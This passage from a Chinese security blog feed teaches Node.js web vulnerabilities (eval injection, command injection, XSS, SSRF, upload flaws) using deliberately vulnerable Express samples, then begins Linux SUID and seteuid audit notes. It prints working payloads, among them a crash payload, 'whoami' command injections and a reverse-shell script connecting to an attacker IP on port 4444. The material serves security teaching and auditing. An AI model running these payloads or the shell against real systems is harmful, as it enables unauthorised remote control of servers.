--save</span><br></pre></td></tr></table></figure><p>以上命令会将Express框架以及几个重要的模块一起安装在node_modules目录中，node_modules目录下会自动创建express目录。几个重要的模块介绍如下：</p><ul><li><strong>body-parser</strong> - node.js 中间件，用于处理 JSON, Raw, Text 和 URL 编码的数据。</li><li><strong>cookie-parser</strong> - 这就是一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。</li><li><strong>multer</strong> - node.js 中间件，用于处理 enctype=”multipart/form-data”（设置表单的MIME编码）的表单数据。</li></ul><p>安装完后，我们可以查看下express使用的版本号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;npm list express</span><br><span class="line">E:\</span><br><span class="line">`-- express@4.17.1</span><br></pre></td></tr></table></figure><p>Demo应用，express_demo.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">   res.send(<span class="string">'Express Test'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8888</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> host = server.address().address</span><br><span class="line">  <span class="keyword">var</span> port = server.address().port</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"应用实例，访问地址为 http://%s:%s"</span>, host, port)</span><br><span class="line"> </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>接着用命令<code>node express_demo.js</code>运行即可访问。</p><p>在页面中访问，可以看到响应报文中有个X-Powered-By头，其值为Express，也就是说，在日常的抓包中看到该头字段即可知道是使用的Node.js的Express框架：</p><p><img src="/2020/03/29/浅析Node-js安全/2.png" alt=""></p><h2 id="0x02-Node-js安全"><a href="#0x02-Node-js安全" class="headerlink" title="0x02 Node.js安全"></a>0x02 Node.js安全</h2><p>Node.js中的Web安全问题和传统的Web安全问题都是一样的，只是代码实现上有语法的差异而已。</p><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>Node.js同样存在代码注入问题，需要重点关注eval、setInteval、setTimeout、new Function等函数的参数是否外部可控。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">eval</span>(req.query.a);</span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">eval</span>(req.query.b);</span><br><span class="line"><span class="keyword">var</span> r = a + b;</span><br><span class="line">res.send(<span class="string">'Sum a+b='</span> + r);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>强制应用退出的payload如下，执行之后Express服务就终止了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=1&amp;b=process.exit()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/3.png" alt=""></p><p>再深入利用，反弹shell的payload如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rev</span>(<span class="params">host,port</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">var</span> cp  = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"><span class="keyword">var</span> cmd = cp.spawn(<span class="string">'cmd.exe'</span>, []);</span><br><span class="line"><span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">client.connect(port, host, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">client.write(<span class="string">'Connected\r\n'</span>); client.pipe(cmd.stdin); cmd.stdout.pipe(client);</span><br><span class="line">cmd.stderr.pipe(client);</span><br><span class="line">client.on( <span class="string">'exit'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">code,signal</span>)</span>&#123; client.end(<span class="string">'Disconnected\r\n'</span>); &#125; );</span><br><span class="line">client.on( <span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123; setTimeout( rev(host,port), <span class="number">5000</span>); &#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line">rev(<span class="string">'192.168.10.137'</span>, <span class="number">4444</span>);</span><br></pre></td></tr></table></figure><p>直接注入访问：</p><p><img src="/2020/03/29/浅析Node-js安全/4.png" alt=""></p><p>在Kali中成功拿到反弹shell：</p><p><img src="/2020/03/29/浅析Node-js安全/5.png" alt=""></p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>Node.js同样存在命名注入漏洞，需重点关注模块child_process的函数，因为这个模块包含了创建一个新进程来执行系统命令的功能。</p><p>示例代码如下，直接使用外部参数拼接ping命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> cmd = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">cmd.exec(<span class="string">"ping -n 4 "</span> + req.query.ip,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">res.send(<span class="string">'Ping Results: &lt;pre&gt;'</span> + data + <span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>正常访问：</p><p><img src="/2020/03/29/浅析Node-js安全/6.png" alt=""></p><p>尝试进行命令注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=|whoami</span><br><span class="line">?ip=127.0.0.1||whoami</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/7.png" alt=""></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>Node.js本身没有XSS防护机制，也不像Java那样拥有强大的过滤器来实现过滤用户的有害输入从而防御XSS。若是未经过滤直接显示外部的输入则导致XSS。但是可以通过设置HTTP头中加入X-XSS-Protection在浏览器端缓解XSS。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">res.send(<span class="string">'Hello, '</span> + req.query.name);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>直接注入XSS payload即可：</p><p><img src="/2020/03/29/浅析Node-js安全/8.png" alt=""></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>Node.js的needle模块可发起GET/POST等HTTP请求，当其参数外部可控时可造成SSRF漏洞。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> needle = <span class="built_in">require</span>(<span class="string">'needle'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> url = req.query[<span class="string">'url'</span>];</span><br><span class="line">needle.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">error, response</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!error &amp;&amp; response.statusCode == <span class="number">200</span>)</span><br><span class="line">res.send(response.body);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'new request:'</span> + url);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/9.png" alt=""></p><h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>Node.js有一个奇怪的特性，即允许一个参数有多个值。假设有一个参数叫做name，我们给这个参数传递了多个值，最终name参数将包含这两个值，两个值之间用逗号隔开。该特性可用来进行参数解析漏洞的利用。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> name = req.query.name;</span><br><span class="line">res.send(<span class="string">"Name: "</span> + name);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/10.png" alt=""></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><blockquote><p>Node.js的网站注入漏洞很少。Node.js通常与mysql/mongodb搭配使用，因为sql注入的漏洞危害很高并且存在多年了，一些新出现的语言如openresty+lua/node.js等天生会规避掉这种安全问题。它们通常都采用了占位符或者叫参数化查询来与数据库交互。node.js 原生的与数据库交互代码如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mysql = <span class="built_in">require</span> (<span class="string">'mysql'</span>) ; </span><br><span class="line"><span class="keyword">var</span> connection = mysql .createConnection(</span><br><span class="line">&#123; <span class="attr">host</span>: <span class="string">'localhost'</span>, </span><br><span class="line">user: <span class="string">'root'</span>, </span><br><span class="line">password: <span class="string">'root'</span>,</span><br><span class="line">port: <span class="string">'3306'</span>, </span><br><span class="line">database: <span class="string">'admin'</span>, &#125;) ; </span><br><span class="line">connection.connect( ); </span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">'select * from admin where id =?'</span><span class="string">'; </span></span><br><span class="line"><span class="string">Var  param=[1];</span></span><br><span class="line"><span class="string">connection.query( sql，param); </span></span><br><span class="line"><span class="string">connection.end( );</span></span><br></pre></td></tr></table></figure><blockquote><p>Node.js现在已经有了orm框架（比如Sequelize），因此注入漏洞就跟少了。但是如果程序员写代码时不小心用了字符串拼接，还是会造成sql注入的。如下：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span>  <span class="keyword">where</span> <span class="keyword">id</span>=$<span class="keyword">id</span></span><br></pre></td></tr></table></figure><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote><p>Node.js的网站由于特有的路由规则，它的的上传问题虽然不像php、jsp、asp等脚本语言，若攻击者上传若未经过滤的脚本，便可轻松的拿到shel。但是代码中若存在路径跳转漏洞，攻击者可以直接将shell脚本木马上传到/etc/rc.d等启动项下面,或者是直接上传相应的index.js文件覆盖到第三方模块express等目录下，通过精心构造的js文件也能实现命令执行的目的。</p></blockquote><p>文件上传示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line">app.use(multer(&#123; <span class="attr">dest</span>: <span class="string">'E:/'</span>&#125;).array(<span class="string">'image'</span>));</span><br><span class="line">app.use(express.static(<span class="string">'public'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(req.files[<span class="number">0</span>]);  <span class="comment">// 上传的文件信息</span></span><br><span class="line"><span class="keyword">var</span> des_file = __dirname + <span class="string">'/'</span> + req.files[<span class="number">0</span>].originalname;</span><br><span class="line">fs.readFile( req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">fs.writeFile(des_file, data, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>( err )&#123;</span><br><span class="line"><span class="built_in">console</span>.log( err );</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">response = &#123;</span><br><span class="line">message:<span class="string">'File uploaded successfully'</span>,</span><br><span class="line">filename:req.files[<span class="number">0</span>].originalname</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( response );</span><br><span class="line">res.end( <span class="built_in">JSON</span>.stringify( response ) );</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>uploadfile.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>File<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Upload File: <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:8181/"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"image"</span> <span class="attr">size</span>=<span class="string">"50"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传文件示例：</p><p><img src="/2020/03/29/浅析Node-js安全/11.png" alt=""></p><h3 id="NPM"><a href="#NPM" class="headerlink" title="NPM"></a>NPM</h3><blockquote><p>任何人都可以创建模块发布到npm上，供别人调用，虽然这为开发者带来了一定的便利性，但必然隐藏着安全隐患，假如一不小心使用了不安全的第三方模块后果可想而知了，比如前段时间闹得沸沸扬扬的node-serialize模块所引起的远程代码执行漏洞（cve-2017-5914）。现在有一款NSP 工具可以帮助检查第三方模块现有漏洞。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i nsp –g //安装nsp</span><br><span class="line">nsp check 要检查的package.json //检查是否有漏洞</span><br></pre></td></tr></table></figure><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>可参考：<a href="http://localhost:4000/2020/03/29/node-serialize反序列化漏洞/" target="_blank" rel="noopener">《node-serialize反序列化漏洞》</a>。</p><h2 id="0x03-工具"><a href="#0x03-工具" class="headerlink" title="0x03 工具"></a>0x03 工具</h2><p>参考：<a href="https://github.com/ajinabraham/NodeJsScan" target="_blank" rel="noopener">https://github.com/ajinabraham/NodeJsScan</a></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.freebuf.com/articles/web/152891.html" target="_blank" rel="noopener">浅谈Node.js Web的安全问题</a></p><p><a href="https://www.jianshu.com/p/8253adac33d8" target="_blank" rel="noopener">渗透测试 Node.js 应用</a></p><p><a href="https://zhuanlan.zhihu.com/p/25894270" target="_blank" rel="noopener">实战教你如何利用NodeJS 漏洞？</a></p><p><a href="https://resources.infosecinstitute.com/penetration-testing-node-js-applications-part-1/" target="_blank" rel="noopener">An Introduction to Penetration Testing Node.js Applications</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
      <category term="Node.js" scheme="https://www.mi1k7ea.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>Linux安全笔记</title>
    <link href="https://www.mi1k7ea.com/2020/03/28/Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.mi1k7ea.com/2020/03/28/Linux安全笔记/</id>
    <published>2020-03-28T13:33:27.000Z</published>
    <updated>2020-03-28T17:08:28.370Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Linux中一些基础安全问题的排查笔记。</p><h2 id="0x01-已知CVE漏洞"><a href="#0x01-已知CVE漏洞" class="headerlink" title="0x01 已知CVE漏洞"></a>0x01 已知CVE漏洞</h2><p>Linux最大的安全问题就是自带的重要组件及内核存在已知CVE漏洞。</p><ul><li>对于Linux Server，可查询供应商的补丁版本情况，与被测版本进行对比。</li><li>对于嵌入式Linux，可及时跟踪cvedetails网站，关注kernel、glibc、openssl、bash、openssh等重要组件的CVE漏洞情况。</li></ul><h2 id="0x02-进程权限管理"><a href="#0x02-进程权限管理" class="headerlink" title="0x02 进程权限管理"></a>0x02 进程权限管理</h2><h3 id="业务进程以root权限运行"><a href="#业务进程以root权限运行" class="headerlink" title="业务进程以root权限运行"></a>业务进程以root权限运行</h3><p>用<code>ps</code>命令列出Linux中所有进程信息，逐个确认以root权限运行的进程是否为必要的，应尽量满足最小权限原则。</p><h3 id="业务进程以root启动但使用seteuid进行伪装"><a href="#业务进程以root启动但使用seteuid进行伪装" class="headerlink" title="业务进程以root启动但使用seteuid进行伪装"></a>业务进程以root启动但使用seteuid进行伪装</h3><p>在Linux下有4个UID：RUID（real user id，实际用户ID）、EUID（effective user id，有效用户ID）、SUID（saved user id，保存的设置用户ID）、SUID（set user id），其具体区别如下：</p><ol><li>RUID，用于在系统中标识一个用户是谁，当用户使用用户名和密码成功登录后一个Linux系统后就唯一确定了他的RUID；</li><li>EUID，用于系统决定用户对系统资源的访问权限，通常情况下等于RUID；</li><li>SUID（set user id），用于对外权限的开放。跟RUID及EUID是用一个用户绑定不同，它是跟文件而不是跟用户绑定；</li><li>saved uid，这个实际上是一个虚拟概念，其对应的实际上还是RUID和SUID，只是在不同身份之间切换时变成对应的值；</li></ol><p>在Linux中设置uid的几个函数如下。</p><p>int setuid(uid_t uid) ：</p><ul><li>若进程具有超级用户权限，则setuid将实际用户ID、有效用户ID及保存的设置用户ID设置为uid </li><li>若进程没有超级用户权限，但是uid等于实际用户ID或保存的设置用户ID，则setuid只将有效用户ID设置为uid</li></ul><p>int seteuid(uid_t uid) ：</p><ul><li>若进程具有超级用户权限，则setuid只将有效用户ID设置为uid </li><li>若进程没有超级用户权限，则setuid只将有效用户ID设置为uid，但是uid必须等于实际用户ID或保存的设置用户ID</li></ul><p>int setreuid(uid_t ruid, uid_t euid) ：</p><ul><li>针对设置用户ID位的程序: 交换有效用户ID和保存的设置用户ID</li><li>针对没有设置用户ID位的程序: 交换有效用户ID和实际用户ID</li></ul><p><strong>setuid()与seteuid()的区别</strong></p><p>setuid()用来重新设置执行目前进程的用户识别码。不过，要让此函数有作用，其有效的用户识别码必须为0(root)。在Linux下，当root使用setuid()来变换成其他用户识别码时，root权限会被抛弃，完全转换成该用户身份。也就是说，该进程往后将不再具有可setuid()的权利，如果只是向暂时抛弃root 权限，稍后想重新取回权限，则必须使用seteuid()。</p><p><strong>问题场景</strong></p><p>某些场景下，在启动业务进程时，以root用户运行，但在初始化结束后调用seteuid降为普通用户，使用<code>ps</code>命令查看时对应的进程用户显示为普通用户。但是，此时业务进程可以在任何时候调用seteuid切换为root用户。</p><p>这种情况尤为需要警惕，因为业务进程实际上是具备root权限的，只是使用seteuid进行伪装而已。</p><p>排查方法：使用IDA打开业务进程对应的二进制文件（含所依赖的动态库），查看其中是否存在调用seteuid，若有则表示进行在运行中会随时切换用户。</p><h2 id="0x03-文件访问权限"><a href="#0x03-文件访问权限" class="headerlink" title="0x03 文件访问权限"></a>0x03 文件访问权限</h2><h3 id="系统存在未授权的suid权限的程序"><a href="#系统存在未授权的suid权限的程序" class="headerlink" title="系统存在未授权的suid权限的程序"></a>系统存在未授权的suid权限的程序</h3><p>在Linux中，SUID是Set User ID，SGID是Set Group ID。suid意味着如果A用户对属于他自己的shell脚本文件设置了这种权限，那么其他用户在执行这个脚本的时候就拥有了A用户的权限。所以，如果root用户对某一脚本设置了这一权限的话则其他用户执行该脚本的时候则拥有了root用户权限。同理，guid意味着执行相应脚本的用户则拥有了该文件所属用户组中用户的权限。</p><p>系统会自带一些具备suid权限位的程序，特征就是代表execute权限位的”x”为”s”，例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ski12@ubuntu:~$ ls -l /usr/bin/passwd </span><br><span class="line">-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd</span><br><span class="line">ski12@ubuntu:~$</span><br></pre></td></tr></table></figure><p>若一个二进制文件本来无可执行权限，却又被增加了suid权限位，对应的execute权限位就是大写的”S”，出现这种情况一般是文件权限设定错误，在文件没有可执行权限时，没有危害，但还是需要去除suid权限位。</p><p>需要关注的是那些无需suid权限位的二进制文件被设置了suid权限，可以使用find命令将系统中属主为root的suid权限的文件找出来，逐个确认：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -user root -perm -4000 -print</span><br></pre></td></tr></table></figure><p><img src="/2020/03/28/Linux安全笔记/1.png" alt=""></p><p>同样的，具备sgid权限的二进制文件，表示在执行过程中会获取二进制文件所属group权限，查找命令如下，对列出的文件逐个确认即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -2000 -print</span><br></pre></td></tr></table></figure><p><img src="/2020/03/28/Linux安全笔记/2.png" alt=""></p><h3 id="属主为普通用户的二进制文件被root执行"><a href="#属主为普通用户的二进制文件被root执行" class="headerlink" title="属主为普通用户的二进制文件被root执行"></a>属主为普通用户的二进制文件被root执行</h3><p>若属主为普通用户的文件或普通用户具有写权限的文件，当root在某些场景下会自发运行该可执行文件时，如果普通用户往文件内容中插入恶意代码，则会造成提权等安全问题。</p><p>另外，Crontab定时任务所执行的脚本或命令同样是需要重点排查的对象。</p><h3 id="普通用户拥有设备文件的读写权限"><a href="#普通用户拥有设备文件的读写权限" class="headerlink" title="普通用户拥有设备文件的读写权限"></a>普通用户拥有设备文件的读写权限</h3><p>除了/dev/zero、/dev/random、/dev/null等一些公用设备，大部分设备普通用户是不能有读写权限的，具体情况具体分析。</p><h2 id="0x04-用户管理"><a 